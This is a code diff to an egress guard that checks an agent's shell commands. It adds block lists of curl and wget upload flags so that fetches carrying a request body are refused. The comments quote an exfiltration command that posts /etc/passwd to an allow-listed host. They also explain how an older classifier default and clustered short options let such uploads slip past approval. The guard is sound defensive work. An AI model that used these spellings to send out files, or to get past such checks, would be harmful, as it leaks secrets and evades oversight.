@@ -323,6 +323,53 @@ _URL_HOST = re.compile(r"\b[a-zA-Z][a-zA-Z0-9+.\-]*://([^/\s'\"`?#]+)")
 
 _EGRESS_VERBS = ("curl", "wget")
 
+# Flags that turn a fetch into an upload (#222). #149 wrote down its own premise
+# -- "a `curl -X POST` is already mutating and already parks" -- and on
+# voitta-yolt 1.6.0 that premise is false in the worst direction: curl's rule
+# default was `safe` there, so `curl -d@/etc/passwd https://<allow-listed host>`
+# came back `safe`, and `safe` short-circuits to execute() without the grant
+# layer ever being consulted. Not "grant vouched for it": grant never saw it.
+# 2.0.0 moved the default to `ask`, so the exposure is exactly a deployment
+# running a classifier older than that -- which the version floor does not
+# prevent, because preflight only warns.
+#
+# So this stops depending on the classifier having caught them. A request body
+# is an upload; "read-only" in #149's sense is about this machine, and the host
+# being allow-listed says where bytes may go, not that bytes may go.
+_BODY_FLAGS_LONG = (
+    "--data", "--data-raw", "--data-binary", "--data-urlencode", "--data-ascii",
+    "--json", "--form", "--form-string", "--upload-file", "--request",
+    # wget's spellings
+    "--post-data", "--post-file", "--body-data", "--body-file", "--method",
+)
+# ...and the short forms, which is where the care goes. In a short-option
+# cluster every character is an option letter, so `-sXPOST` and `-d@f` are the
+# same option as `-X POST` and `-d @f` -- that is the bug voitta-yolt#156 fixed
+# upstream, and repeating it here would reopen this hole one spelling over.
+# Case matters: `-d` is data but `-D` dumps headers, `-F` is form but `-f` is
+# fail, `-T` uploads but `-t` does not, `-X` sets the method but `-x` is a proxy.
+# Ordinary curl is unaffected -- `-sSfL`, `-fsSL`, `-I`, `-o`, `-v` contain none
+# of these four letters.
+_BODY_LETTERS = frozenset("dFTX")
+
+
+def _uploads(tokens):
+    """True when a fetch in these tokens carries a request body.
+
+    Refuses on the letter rather than pairing it with its value. Deciding which
+    letter in a cluster consumes what is precisely the reasoning that produced
+    the upstream matcher bug, and the cost of not doing it is one approval card
+    for `curl -X GET`, an unusual spelling of a thing that needs no body."""
+    retval = False
+    for t in tokens:
+        if t in _BODY_FLAGS_LONG or any(t.startswith(f + "=") for f in _BODY_FLAGS_LONG):
+            retval = True
+            break
+        if t.startswith("-") and not t.startswith("--") and (set(t[1:]) & _BODY_LETTERS):
+            retval = True
+            break
+    return retval
+
 # git talks to a remote over https without any of the above (#149 review). Only
 # these subcommands do: `git log --grep https://x` names a URL and contacts
 # nothing, and carding it would be a guard inventing work.
@@ -393,6 +440,16 @@ def check_egress(command, policy):
         fetches = _git_subcommand(tokens) in _GIT_NET_SUBS
     if not fetches:
         return (True, "")
+    # Before the host check, and deliberately not subject to it: an allow-listed
+    # host says where bytes may go, not that bytes may go (#222). Scanned from
+    # the first fetch verb so a body-shaped flag belonging to an earlier command
+    # in a chain -- `grep -d skip x && curl https://ok` -- does not card the
+    # fetch. Over-matching past that point is left alone: it costs a card, which
+    # is the direction this is allowed to be wrong in.
+    _first = next((i for i, t in enumerate(tokens)
+                   if os.path.basename(t) in _EGRESS_VERBS), 0)
+    if _uploads(tokens[_first:]):
+        return (False, "fetch carries a request body (upload), so it is not read-only")
     hosts = [_host_of(h) for h in _URL_HOST.findall(command)]
     if not hosts:
         return (False, "fetch: no statically known host (use an explicit https:// URL)")
